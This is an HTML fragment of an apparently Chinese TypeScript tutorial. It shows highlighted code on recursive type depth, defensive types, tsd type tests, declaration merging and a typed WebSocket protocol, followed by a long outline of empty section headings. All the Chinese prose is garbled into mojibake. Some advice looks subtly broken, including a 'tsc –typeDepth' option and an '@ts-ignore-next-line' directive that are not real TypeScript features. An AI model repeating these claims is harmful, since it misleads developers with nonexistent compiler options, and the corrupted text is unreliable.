class="hljs-built_in">never</span> : <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span> ? &#123;<br>    [K <span class="hljs-keyword">in</span> keyof T]: <span class="hljs-title class_">MaxDepth</span>&lt;T[K], <span class="hljs-title class_">Subtract</span>&lt;D, <span class="hljs-number">1</span>&gt;&gt;<br>  &#125; : T;<br><br><span class="hljs-comment">// âŒ å±é™©ï¼šæ— é™é€’å½’</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">InfiniteRecursion</span>&lt;T&gt; = &#123;<br>  <span class="hljs-attr">value</span>: T;<br>  <span class="hljs-attr">children</span>: <span class="hljs-title class_">InfiniteRecursion</span>&lt;T&gt;[]; <span class="hljs-comment">// å¯èƒ½å¼•å‘ç±»å‹å®ä¾‹åŒ–è¿‡æ·±é”™è¯¯</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>æŠ€å·§2ï¼šé˜²å¾¡æ€§ç±»å‹è®¾è®¡</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// é˜²èŒƒä¸å®Œæ•´æ•°æ®</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">SafeAccess</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span> ? &#123;<br>  [K <span class="hljs-keyword">in</span> keyof T]-?: <span class="hljs-title class_">SafeAccess</span>&lt;T[K]&gt;; <span class="hljs-comment">// ç§»é™¤å¯é€‰ä¿®é¥°ç¬¦</span><br>&#125; : T;<br><br><span class="hljs-comment">// ä½¿ç”¨ never é˜»æ–­éæ³•è·¯å¾„</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ValidateRoute</span>&lt;<span class="hljs-title class_">Path</span>&gt; = <br>  <span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`/user/<span class="hljs-subst">$&#123;infer Id&#125;</span>`</span> <br>    ? <span class="hljs-title class_">Id</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">number</span>&#125;</span>`</span> <br>      ? <span class="hljs-title class_">Path</span> <br>      : <span class="hljs-built_in">never</span> <br>    : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹åŒ–å®è·µ</strong></p><p>ç­–ç•¥1ï¼šç±»å‹æµ‹è¯•ï¼ˆä½¿ç”¨ tsd ç­‰å·¥å…·ï¼‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æµ‹è¯•ç±»å‹æ˜¯å¦ç¬¦åˆé¢„æœŸ</span><br><span class="hljs-keyword">import</span> &#123; expectType &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;tsd&#x27;</span>;<br><br>expectType&lt;&#123; <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span> &#125;&gt;(<span class="hljs-title function_">fetchUserList</span>().<span class="hljs-property">data</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p>ç­–ç•¥2ï¼šå£°æ˜æ–‡ä»¶ç»„ç»‡è§„èŒƒ</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">types/<br>â”œâ”€â”€ global.d.ts         # å…¨å±€å£°æ˜<br>â”œâ”€â”€ libs/               # ç¬¬ä¸‰æ–¹åº“æ‰©å±•<br>â”‚   â””â”€â”€ vue-extend.d.ts<br>â”œâ”€â”€ modules/            # ä¸šåŠ¡æ¨¡å—<br>â”‚   â””â”€â”€ user-api.d.ts<br>â””â”€â”€ utils/              # å·¥å…·ç±»å‹<br>    â””â”€â”€ pagination.d.ts<br></code></pre></td></tr></table></figure><p>ç­–ç•¥3ï¼šç‰ˆæœ¬å…¼å®¹å¤„ç†</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ¡ä»¶ç¼–è¯‘æ”¯æŒå¤šç‰ˆæœ¬</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&quot;some-lib&quot;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>    <span class="hljs-comment">// @ts-ignore-next-line å…¼å®¹æ—§ç‰ˆæœ¬ç±»å‹ç¼ºå¤±</span><br>    <span class="hljs-attr">newFeature</span>?: <span class="hljs-built_in">boolean</span>; <br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•çº§è€ƒç‚¹</strong></p><ul><li>ç±»å‹å®ä¾‹åŒ–æ·±åº¦é™åˆ¶ï¼šé»˜è®¤ 50 å±‚ï¼ˆé€šè¿‡ tsc â€“typeDepth è°ƒæ•´ï¼‰</li><li>å£°æ˜åˆå¹¶ä¼˜å…ˆçº§ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> A &#123; <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span> &#125;<br><span class="hljs-keyword">interface</span> A &#123; <span class="hljs-attr">x</span>: <span class="hljs-built_in">string</span> &#125;  <span class="hljs-comment">// âŒ åç»­å£°æ˜å¿…é¡»å…¼å®¹å‰åºå£°æ˜</span><br></code></pre></td></tr></table></figure><ul><li>ç±»å‹æ€§èƒ½ä¼˜åŒ–ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// âœ… é«˜æ•ˆï¼šä½¿ç”¨æ˜ å°„ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReadonlyDeep</span>&lt;T&gt; = &#123; <span class="hljs-keyword">readonly</span> [K <span class="hljs-keyword">in</span> keyof T]: <span class="hljs-title class_">ReadonlyDeep</span>&lt;T[K]&gt; &#125;<br><br><span class="hljs-comment">// âŒ ä½æ•ˆï¼šé€’å½’æ¡ä»¶ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">SlowType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span> ? <span class="hljs-title class_">SlowType</span>&lt;T[keyof T]&gt; : T<br></code></pre></td></tr></table></figure><ul><li>d.ts ä¸ ts æ–‡ä»¶å·®å¼‚ï¼š.d.ts ä¸åŒ…å«å®ç°ï¼Œä»…ç±»å‹å£°æ˜</li><li>å®æˆ˜æ¡ˆä¾‹ï¼šä¸º WebSocket æ¶ˆæ¯åè®®å£°æ˜ç±»å‹å®‰å…¨è§£æå™¨</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MessageProtocol</span> = &#123;<br>  <span class="hljs-attr">login</span>: &#123; <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">password</span>: <span class="hljs-built_in">string</span> &#125;;<br>  <span class="hljs-attr">joinRoom</span>: &#123; <span class="hljs-attr">roomId</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span> &#125;;<br>  <span class="hljs-comment">// ä½¿ç”¨æ¨¡æ¿ç±»å‹è‡ªåŠ¨ç”Ÿæˆäº‹ä»¶åçº¦æŸ</span><br>  [E <span class="hljs-keyword">in</span> <span class="hljs-string">`sys/<span class="hljs-subst">$&#123;<span class="hljs-string">&#x27;alert&#x27;</span> | <span class="hljs-string">&#x27;error&#x27;</span>&#125;</span>`</span>]: &#123; <span class="hljs-attr">code</span>: <span class="hljs-built_in">number</span> &#125;;<br>&#125;;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> handleMessage&lt;K <span class="hljs-keyword">extends</span> keyof <span class="hljs-title class_">MessageProtocol</span>&gt;(<br>  <span class="hljs-attr">type</span>: K,<br>  <span class="hljs-attr">handler</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">payload</span>: <span class="hljs-title class_">MessageProtocol</span>[K]</span>) =&gt;</span> <span class="hljs-built_in">void</span><br>): <span class="hljs-built_in">void</span>;<br></code></pre></td></tr></table></figure><h2 id="3-3-ä»£ç è´¨é‡ä¿éšœ"><a href="#3-3-ä»£ç è´¨é‡ä¿éšœ" class="headerlink" title="3.3 ä»£ç è´¨é‡ä¿éšœ"></a>3.3 ä»£ç è´¨é‡ä¿éšœ</h2><h3 id="3-3-1-ESLint-ç±»å‹è§„åˆ™é…ç½®"><a href="#3-3-1-ESLint-ç±»å‹è§„åˆ™é…ç½®" class="headerlink" title="3.3.1 ESLint ç±»å‹è§„åˆ™é…ç½®"></a>3.3.1 ESLint ç±»å‹è§„åˆ™é…ç½®</h3><h3 id="3-3-2-å•å…ƒæµ‹è¯•ç±»å‹æ£€æŸ¥æ–¹æ¡ˆ"><a href="#3-3-2-å•å…ƒæµ‹è¯•ç±»å‹æ£€æŸ¥æ–¹æ¡ˆ" class="headerlink" title="3.3.2 å•å…ƒæµ‹è¯•ç±»å‹æ£€æŸ¥æ–¹æ¡ˆ"></a>3.3.2 å•å…ƒæµ‹è¯•ç±»å‹æ£€æŸ¥æ–¹æ¡ˆ</h3><h3 id="3-3-3-è‡ªå®šä¹‰ç±»å‹è§„åˆ™å¼€å‘"><a href="#3-3-3-è‡ªå®šä¹‰ç±»å‹è§„åˆ™å¼€å‘" class="headerlink" title="3.3.3 è‡ªå®šä¹‰ç±»å‹è§„åˆ™å¼€å‘"></a>3.3.3 è‡ªå®šä¹‰ç±»å‹è§„åˆ™å¼€å‘</h3><h3 id="3-3-4-CI-CD-ä¸­çš„ç±»å‹æ£€æŸ¥"><a href="#3-3-4-CI-CD-ä¸­çš„ç±»å‹æ£€æŸ¥" class="headerlink" title="3.3.4 CI&#x2F;CD ä¸­çš„ç±»å‹æ£€æŸ¥"></a>3.3.4 CI&#x2F;CD ä¸­çš„ç±»å‹æ£€æŸ¥</h3><h2 id="3-4-æ„å»ºä¼˜åŒ–"><a href="#3-4-æ„å»ºä¼˜åŒ–" class="headerlink" title="3.4 æ„å»ºä¼˜åŒ–"></a>3.4 æ„å»ºä¼˜åŒ–</h2><h3 id="3-4-1-Webpack-æ„å»ºç¼“å­˜é…ç½®"><a href="#3-4-1-Webpack-æ„å»ºç¼“å­˜é…ç½®" class="headerlink" title="3.4.1 Webpack æ„å»ºç¼“å­˜é…ç½®"></a>3.4.1 Webpack æ„å»ºç¼“å­˜é…ç½®</h3><h3 id="3-4-2-Babel-ä¸-tsc-ç¼–è¯‘å¯¹æ¯”"><a href="#3-4-2-Babel-ä¸-tsc-ç¼–è¯‘å¯¹æ¯”" class="headerlink" title="3.4.2 Babel ä¸ tsc ç¼–è¯‘å¯¹æ¯”"></a>3.4.2 Babel ä¸ tsc ç¼–è¯‘å¯¹æ¯”</h3><h3 id="3-4-3-å¢é‡ç¼–è¯‘åŸç†ä¸å®è·µ"><a href="#3-4-3-å¢é‡ç¼–è¯‘åŸç†ä¸å®è·µ" class="headerlink" title="3.4.3 å¢é‡ç¼–è¯‘åŸç†ä¸å®è·µ"></a>3.4.3 å¢é‡ç¼–è¯‘åŸç†ä¸å®è·µ</h3><h3 id="3-4-4-Monorepo-ç±»å‹ç®¡ç†ç­–ç•¥"><a href="#3-4-4-Monorepo-ç±»å‹ç®¡ç†ç­–ç•¥" class="headerlink" title="3.4.4 Monorepo ç±»å‹ç®¡ç†ç­–ç•¥"></a>3.4.4 Monorepo ç±»å‹ç®¡ç†ç­–ç•¥</h3><h1 id="å››ã€æ¡†æ¶é›†æˆå®è·µ"><a href="#å››ã€æ¡†æ¶é›†æˆå®è·µ" class="headerlink" title="å››ã€æ¡†æ¶é›†æˆå®è·µ"></a>å››ã€æ¡†æ¶é›†æˆå®è·µ</h1><h2 id="4-1-React-ç”Ÿæ€é›†æˆ"><a href="#4-1-React-ç”Ÿæ€é›†æˆ" class="headerlink" title="4.1 React ç”Ÿæ€é›†æˆ"></a>4.1 React ç”Ÿæ€é›†æˆ</h2><h3 id="4-1-1-ç»„ä»¶-Props-é«˜çº§ç±»å‹è®¾è®¡"><a href="#4-1-1-ç»„ä»¶-Props-é«˜çº§ç±»å‹è®¾è®¡" class="headerlink" title="4.1.1 ç»„ä»¶ Props é«˜çº§ç±»å‹è®¾è®¡"></a>4.1.1 ç»„ä»¶ Props é«˜çº§ç±»å‹è®¾è®¡</h3><h3 id="4-1-2-Hooks-æ³›å‹ç±»å‹å®šä¹‰"><a href="#4-1-2-Hooks-æ³›å‹ç±»å‹å®šä¹‰" class="headerlink" title="4.1.2 Hooks æ³›å‹ç±»å‹å®šä¹‰"></a>4.1.2 Hooks æ³›å‹ç±»å‹å®šä¹‰</h3><h3 id="4-1-3-Redux-Toolkit-ç±»å‹å®‰å…¨"><a href="#4-1-3-Redux-Toolkit-ç±»å‹å®‰å…¨" class="headerlink" title="4.1.3 Redux Toolkit ç±»å‹å®‰å…¨"></a>4.1.3 Redux Toolkit ç±»å‹å®‰å…¨</h3><h3 id="4-1-4-React-Router-ç±»å‹å®ˆå«"><a href="#4-1-4-React-Router-ç±»å‹å®ˆå«" class="headerlink" title="4.1.4 React Router ç±»å‹å®ˆå«"></a>4.1.4 React Router ç±»å‹å®ˆå«</h3><h2 id="4-2-Vue-3-ç±»å‹ç³»ç»Ÿ"><a href="#4-2-Vue-3-ç±»å‹ç³»ç»Ÿ" class="headerlink" title="4.2 Vue 3 ç±»å‹ç³»ç»Ÿ"></a>4.2 Vue 3 ç±»å‹ç³»ç»Ÿ</h2><h3 id="4-2-1-Composition-API-ç±»å‹æ¨å¯¼"><a href="#4-2-1-Composition-API-ç±»å‹æ¨å¯¼" class="headerlink" title="4.2.1 Composition API ç±»å‹æ¨å¯¼"></a>4.2.1 Composition API ç±»å‹æ¨å¯¼</h3><h3 id="4-2-2-ç»„ä»¶æ³›å‹-Props-å®ç°"><a href="#4-2-2-ç»„ä»¶æ³›å‹-Props-å®ç°" class="headerlink" title="4.2.2 ç»„ä»¶æ³›å‹ Props å®ç°"></a>4.2.2 ç»„ä»¶æ³›å‹ Props å®ç°</h3><h3 id="4-2-3-Pinia-çŠ¶æ€ç®¡ç†ç±»å‹å®‰å…¨"><a href="#4-2-3-Pinia-çŠ¶æ€ç®¡ç†ç±»å‹å®‰å…¨" class="headerlink" title="4.2.3 Pinia çŠ¶æ€ç®¡ç†ç±»å‹å®‰å…¨"></a>4.2.3 Pinia çŠ¶æ€ç®¡ç†ç±»å‹å®‰å…¨</h3><h3 id="4-2-4-Volar-ç±»å‹å¢å¼ºå®è·µ"><a href="#4-2-4-Volar-ç±»å‹å¢å¼ºå®è·µ" class="headerlink" title="4.2.4 Volar ç±»å‹å¢å¼ºå®è·µ"></a>4.2.4 Volar ç±»å‹å¢å¼ºå®è·µ</h3><h2 id="4-3-Node-js-åç«¯å¼€å‘"><a href="#4-3-Node-js-åç«¯å¼€å‘" class="headerlink" title="4.3 Node.js åç«¯å¼€å‘"></a>4.3 Node.js åç«¯å¼€å‘</h2><h3 id="4-3-1-Express-Koa-ä¸­é—´ä»¶ç±»å‹"><a href="#4-3-1-Express-Koa-ä¸­é—´ä»¶ç±»å‹" class="headerlink" title="4.3.1 Express&#x2F;Koa ä¸­é—´ä»¶ç±»å‹"></a>4.3.1 Express&#x2F;Koa ä¸­é—´ä»¶ç±»å‹</h3><h3 id="4-3-2-ORM-æ¡†æ¶ç±»å‹å®‰å…¨æŸ¥è¯¢"><a href="#4-3-2-ORM-æ¡†æ¶ç±»å‹å®‰å…¨æŸ¥è¯¢" class="headerlink" title="4.3.2 ORM æ¡†æ¶ç±»å‹å®‰å…¨æŸ¥è¯¢"></a>4.3.2 ORM æ¡†æ¶ç±»å‹å®‰å…¨æŸ¥è¯¢</h3><h3 id="4-3-3-RPC-é€šä¿¡ç±»å‹å¥‘çº¦"><a href="#4-3-3-RPC-é€šä¿¡ç±»å‹å¥‘çº¦" class="headerlink" title="4.3.3 RPC é€šä¿¡ç±»å‹å¥‘çº¦"></a>4.3.3 RPC é€šä¿¡ç±»å‹å¥‘çº¦</h3><h3 id="4-3-4-åˆ†å¸ƒå¼äº‹åŠ¡ç±»å‹ä¿éšœ"><a href="#4-3-4-åˆ†å¸ƒå¼äº‹åŠ¡ç±»å‹ä¿éšœ" class="headerlink" title="4.3.4 åˆ†å¸ƒå¼äº‹åŠ¡ç±»å‹ä¿éšœ"></a>4.3.4 åˆ†å¸ƒå¼äº‹åŠ¡ç±»å‹ä¿éšœ</h3><h1 id="äº”ã€æ€§èƒ½ä¼˜åŒ–"><a href="#äº”ã€æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="äº”ã€æ€§èƒ½ä¼˜åŒ–"></a>äº”ã€æ€§èƒ½ä¼˜åŒ–</h1><h2 id="5-1-ç¼–è¯‘æ€§èƒ½ä¼˜åŒ–"><a href="#5-1-ç¼–è¯‘æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="5.1 ç¼–è¯‘æ€§èƒ½ä¼˜åŒ–"></a>5.1 ç¼–è¯‘æ€§èƒ½ä¼˜åŒ–</h2><h3 id="5-1-1-é¡¹ç›®å¼•ç”¨-Project-References"><a href="#5-1-1-é¡¹ç›®å¼•ç”¨-Project-References" class="headerlink" title="5.1.1 é¡¹ç›®å¼•ç”¨(Project References)"></a>5.1.1 é¡¹ç›®å¼•ç”¨(Project References)</h3><h3 id="5-1-2-å¢é‡ç¼–è¯‘åŸç†å‰–æ"><a href="#5-1-2-å¢é‡ç¼–è¯‘åŸç†å‰–æ" class="headerlink" title="5.1.2 å¢é‡ç¼–è¯‘åŸç†å‰–æ"></a>5.1.2 å¢é‡ç¼–è¯‘åŸç†å‰–æ</h3><h3 id="5-1-3-åˆ†å¸ƒå¼ç¼–è¯‘æ–¹æ¡ˆ"><a href="#5-1-3-åˆ†å¸ƒå¼ç¼–è¯‘æ–¹æ¡ˆ" class="headerlink" title="5.1.3 åˆ†å¸ƒå¼ç¼–è¯‘æ–¹æ¡ˆ"></a>5.1.3 åˆ†å¸ƒå¼ç¼–è¯‘æ–¹æ¡ˆ</h3><h3 id="5-1-4-ç¼–è¯‘å™¨ç¼“å­˜ç­–ç•¥"><a href="#5-1-4-ç¼–è¯‘å™¨ç¼“å­˜ç­–ç•¥" class="headerlink" title="5.1.4 ç¼–è¯‘å™¨ç¼“å­˜ç­–ç•¥"></a>5.1.4 ç¼–è¯‘å™¨ç¼“å­˜ç­–ç•¥</h3><h2 id="5-2-ç±»å‹æ€§èƒ½ä¼˜åŒ–"><a href="#5-2-ç±»å‹æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="5.2 ç±»å‹æ€§èƒ½ä¼˜åŒ–"></a>5.2 ç±»å‹æ€§èƒ½ä¼˜åŒ–</h2><h3 id="5-2-1-é¿å…è¿‡åº¦ç±»å‹å®ä¾‹åŒ–"><a href="#5-2-1-é¿å…è¿‡åº¦ç±»å‹å®ä¾‹åŒ–" class="headerlink" title="5.2.1 é¿å…è¿‡åº¦ç±»å‹å®ä¾‹åŒ–"></a>5.2.1 é¿å…è¿‡åº¦ç±»å‹å®ä¾‹åŒ–</h3><h3 id="5-2-2-æ¡ä»¶ç±»å‹çŸ­è·¯æŠ€å·§"><a href="#5-2-2-æ¡ä»¶ç±»å‹çŸ­è·¯æŠ€å·§" class="headerlink" title="5.2.2 æ¡ä»¶ç±»å‹çŸ­è·¯æŠ€å·§"></a>5.2.2 æ¡ä»¶ç±»å‹çŸ­è·¯æŠ€å·§</h3><h3 id="5-2-3-ç±»å‹ç¼“å­˜ç­–ç•¥å®ç°"><a href="#5-2-3-ç±»å‹ç¼“å­˜ç­–ç•¥å®ç°" class="headerlink" title="5.2.3 ç±»å‹ç¼“å­˜ç­–ç•¥å®ç°"></a>5.2.3 ç±»å‹ç¼“å­˜ç­–ç•¥å®ç°</h3><h3 id="5-2-4-ç±»å‹å¤æ‚åº¦åˆ†æ"><a href="#5-2-4-ç±»å‹å¤æ‚åº¦åˆ†æ" class="headerlink" title="5.2.4 ç±»å‹å¤æ‚åº¦åˆ†æ"></a>5.2.4 ç±»å‹å¤æ‚åº¦åˆ†æ</h3><h2 id="5-3-äº§ç‰©ä¼˜åŒ–"><a href="#5-3-äº§ç‰©ä¼˜åŒ–" class="headerlink" title="5.3 äº§ç‰©ä¼˜åŒ–"></a>5.3 äº§ç‰©ä¼˜åŒ–</h2><h3 id="5-3-1-Tree-Shaking-åŸç†ä¸å®ç°"><a href="#5-3-1-Tree-Shaking-åŸç†ä¸å®ç°" class="headerlink" title="5.3.1 Tree Shaking åŸç†ä¸å®ç°"></a>5.3.1 Tree Shaking åŸç†ä¸å®ç°</h3><h3 id="5-3-2-ä»£ç åˆ†å‰²ç±»å‹ä¿éšœ"><a href="#5-3-2-ä»£ç åˆ†å‰²ç±»å‹ä¿éšœ" class="headerlink" title="5.3.2 ä»£ç åˆ†å‰²ç±»å‹ä¿éšœ"></a>5.3.2 ä»£ç åˆ†å‰²ç±»å‹ä¿éšœ</h3><h3 id="5-3-3-è¿è¡Œæ—¶ç±»å‹æ£€æŸ¥æ–¹æ¡ˆ"><a href="#5-3-3-è¿è¡Œæ—¶ç±»å‹æ£€æŸ¥æ–¹æ¡ˆ" class="headerlink" title="5.3.3 è¿è¡Œæ—¶ç±»å‹æ£€æŸ¥æ–¹æ¡ˆ"></a>5.3.3 è¿è¡Œæ—¶ç±»å‹æ£€æŸ¥æ–¹æ¡ˆ</h3><h3 id="5-3-4-ç±»å‹æ“¦é™¤ä¸ä½“ç§¯æ§åˆ¶"><a href="#5-3-4-ç±»å‹æ“¦é™¤ä¸ä½“ç§¯æ§åˆ¶" class="headerlink" title="5.3.4 ç±»å‹æ“¦é™¤ä¸ä½“ç§¯æ§åˆ¶"></a>5.3.4 ç±»å‹æ“¦é™¤ä¸ä½“ç§¯æ§åˆ¶</h3><h1 id="å…­ã€ç»¼åˆèƒ½åŠ›"><a href="#å…­ã€ç»¼åˆèƒ½åŠ›" class="headerlink" title="å…­ã€ç»¼åˆèƒ½åŠ›"></a>å…­ã€ç»¼åˆèƒ½åŠ›</h1><h2 id="6-1-è®¾è®¡æ¨¡å¼ç±»å‹å®ç°"><a href="#6-1-è®¾è®¡æ¨¡å¼ç±»å‹å®ç°" class="headerlink" title="6.1 è®¾è®¡æ¨¡å¼ç±»å‹å®ç°"></a>6.1 è®¾è®¡æ¨¡å¼ç±»å‹å®ç°</h2><h3 id="6-1-1-è£…é¥°å™¨å…ƒç¼–ç¨‹ç±»å‹å®‰å…¨"><a href="#6-1-1-è£…é¥°å™¨å…ƒç¼–ç¨‹ç±»å‹å®‰å…¨" class="headerlink" title="6.1.1 è£…é¥°å™¨å…ƒç¼–ç¨‹ç±»å‹å®‰å…¨"></a>6.1.1 è£…é¥°å™¨å…ƒç¼–ç¨‹ç±»å‹å®‰å…¨</h3><h3 id="6-1-2-ä¾èµ–æ³¨å…¥ç±»å‹æ¨å¯¼"><a href="#6-1-2-ä¾èµ–æ³¨å…¥ç±»å‹æ¨å¯¼" class="headerlink" title="6.1.2 ä¾èµ–æ³¨å…¥ç±»å‹æ¨å¯¼"></a>6.1.2 ä¾èµ–æ³¨å…¥ç±»å‹æ¨å¯¼</h3><h3 id="6-1-3-ç­–ç•¥æ¨¡å¼ç±»å‹æ˜ å°„"><a href="#6-1-3-ç­–ç•¥æ¨¡å¼ç±»å‹æ˜ å°„" class="headerlink" title="6.1.3 ç­–ç•¥æ¨¡å¼ç±»å‹æ˜ å°„"></a>6.1.3 ç­–ç•¥æ¨¡å¼ç±»å‹æ˜ å°„</h3><h3 id="6-1-4-çŠ¶æ€æœºç±»å‹å®ç°"><a href="#6-1-4-çŠ¶æ€æœºç±»å‹å®ç°" class="headerlink" title="6.1.4 çŠ¶æ€æœºç±»å‹å®ç°"></a>6.1.4 çŠ¶æ€æœºç±»å‹å®ç°</h3><h2 id="6-2-è°ƒè¯•ä¸é‡æ„"><a href="#6-2-è°ƒè¯•ä¸é‡æ„" class="headerlink" title="6.2 è°ƒè¯•ä¸é‡æ„"></a>6.2 è°ƒè¯•ä¸é‡æ„</h2><h3 id="6-2-1-å¤æ‚ç±»å‹é”™è¯¯è¿½è¸ªæŠ€å·§"><a href="#6-2-1-å¤æ‚ç±»å‹é”™è¯¯è¿½è¸ªæŠ€å·§" class="headerlink" title="6.2.1 å¤æ‚ç±»å‹é”™è¯¯è¿½è¸ªæŠ€å·§"></a>6.2.1 å¤æ‚ç±»å‹é”™è¯¯è¿½è¸ªæŠ€å·§</h3><h3 id="6-2-2-å£°æ˜æ–‡ä»¶è°ƒè¯•æ–¹æ³•è®º"><a href="#6-2-2-å£°æ˜æ–‡ä»¶è°ƒè¯•æ–¹æ³•è®º" class="headerlink" title="6.2.2 å£°æ˜æ–‡ä»¶è°ƒè¯•æ–¹æ³•è®º"></a>6.2.2 å£°æ˜æ–‡ä»¶è°ƒè¯•æ–¹æ³•è®º</h3><h3 id="6-2-3-é—ç•™ç³»ç»Ÿæ¸è¿›å¼è¿ç§»"><a href="#6-2-3-é—ç•™ç³»ç»Ÿæ¸è¿›å¼è¿ç§»" class="headerlink" title="6.2.3 é—ç•™ç³»ç»Ÿæ¸è¿›å¼è¿ç§»"></a>6.2.3 é—ç•™ç³»ç»Ÿæ¸è¿›å¼è¿ç§»</h3><h3 id="6-2-4-ç±»å‹å®‰å…¨çš„é‡æ„ä¿éšœ"><a href="#6-2-4-ç±»å‹å®‰å…¨çš„é‡æ„ä¿éšœ" class="headerlink" title="6.2.4 ç±»å‹å®‰å…¨çš„é‡æ„ä¿éšœ"></a>6.2.4 ç±»å‹å®‰å…¨çš„é‡æ„ä¿éšœ</h3><h2 id="6-3-å‰æ²¿æ¶æ„"><a href="#6-3-å‰æ²¿æ¶æ„" class="headerlink" title="6.3 å‰æ²¿æ¶æ„"></a>6.3 å‰æ²¿æ¶æ„</h2><h3 id="6-3-1-å¾®å‰ç«¯ç±»å‹é€šä¿¡æ–¹æ¡ˆ"><a href="#6-3-1-å¾®å‰ç«¯ç±»å‹é€šä¿¡æ–¹æ¡ˆ" class="headerlink" title="6.3.1 å¾®å‰ç«¯ç±»å‹é€šä¿¡æ–¹æ¡ˆ"></a>6.3.1 å¾®å‰ç«¯ç±»å‹é€šä¿¡æ–¹æ¡ˆ</h3><h3 id="6-3-2-Serverless-å‡½æ•°ç±»å‹å®‰å…¨"><a href="#6-3-2-Serverless-å‡½æ•°ç±»å‹å®‰å…¨" class="headerlink" title="6.3.2 Serverless å‡½æ•°ç±»å‹å®‰å…¨"></a>6.3.2 Serverless å‡½æ•°ç±»å‹å®‰å…¨</h3><h3 id="6-3-3-WebAssembly-ç±»å‹é›†æˆ"><a href="#6-3-3-WebAssembly-ç±»å‹é›†æˆ" class="headerlink" title="6.3.3 WebAssembly ç±»å‹é›†æˆ"></a>6.3.3 WebAssembly ç±»å‹é›†æˆ</h3><h3 id="6-3-4-Web-Workers-ç±»å‹é€šä¿¡"><a href="#6-3-4-Web-Workers-ç±»å‹é€šä¿¡" class="headerlink" title="6.3.4 Web Workers ç±»å‹é€šä¿¡"></a>6.3.4 Web Workers ç±»å‹é€šä¿¡</h3><h2 id="6-4-é¢è¯•ä¸“é¡¹"><a href="#6-4-é¢è¯•ä¸“é¡¹" class="headerlink" title="6.4 é¢è¯•ä¸“é¡¹"></a>6.4 é¢è¯•ä¸“é¡¹</h2><h3 id="6-4-1-ç±»å‹ä½“æ“è§£é¢˜æ€è·¯"><a href="#6-4-1-ç±»å‹ä½“æ“è§£é¢˜æ€è·¯" class="headerlink" title="6.4.1 ç±»å‹ä½“æ“è§£é¢˜æ€è·¯"></a>6.4.1 ç±»å‹ä½“æ“è§£é¢˜æ€è·¯</h3><h3 id="6-4-2-ç¼–è¯‘åŸç†ç›¸å…³é—®é¢˜"><a href="#6-4-2-ç¼–è¯‘åŸç†ç›¸å…³é—®é¢˜" class="headerlink" title="6.4.2 ç¼–è¯‘åŸç†ç›¸å…³é—®é¢˜"></a>6.4.2 ç¼–è¯‘åŸç†ç›¸å…³é—®é¢˜</h3><h3 id="6-4-3-æ¡†æ¶é›†æˆè®¾è®¡é—®é¢˜"><a href="#6-4-3-æ¡†æ¶é›†æˆè®¾è®¡é—®é¢˜" class="headerlink" title="6.4.3 æ¡†æ¶é›†æˆè®¾è®¡é—®é¢˜"></a>6.4.3 